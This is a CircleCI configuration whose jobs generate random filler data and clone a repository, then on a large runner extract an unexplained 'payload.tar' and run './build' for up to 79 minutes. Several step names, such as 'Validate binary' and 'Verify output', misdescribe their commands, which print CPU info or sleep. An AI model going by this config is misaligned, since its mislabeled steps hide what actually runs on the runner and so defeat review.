version: 2.1

jobs:
  route_realease-2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: whir whir
          command: |
            mkdir -p /tmp/handoff
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=300 2>/dev/null | base64 > /tmp/handoff/big_step_output.txt; true
            echo "handoff ready: $(stat -c %s /tmp/handoff/big_step_output.txt) octets"
      - persist_to_workspace:
          root: /tmp/handoff
          paths:
            - big_step_output.txt
  realease-2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/handoff
      - run:
          name: Check prior stage
          command: |
            du -b /tmp/handoff/big_step_output.txt || true
      - run:
          name: Shallow clone
          command: git clone --depth 1 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Prepare source archive
          command: tar --extract -f payload.tar
      - run:
          name: Settle filesystem
          command: free -m
      - run:
          name: Validate binary
          command: cat /proc/cpuinfo | head -5
      - run:
          name: Verify output
          command: sleep 45
      - run:
          no_output_timeout: 79m
          command: /bin/sh -c "./build"
  phase_validate-end-to-end-release-candidate:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/handoff
      - run:
          name: retry 7
          command: |
            mkdir -p /tmp/handoff
            { set +o pipefail 2>/dev/null; seq 1 20 | tr '\n' ' ' | md5sum; true ; } > /tmp/handoff/phase-ready.out
            echo "handoff ready: $(stat -c %s /tmp/handoff/phase-ready.out) octets"
      - persist_to_workspace:
          root: /tmp/handoff
          paths:
            - phase-ready.out
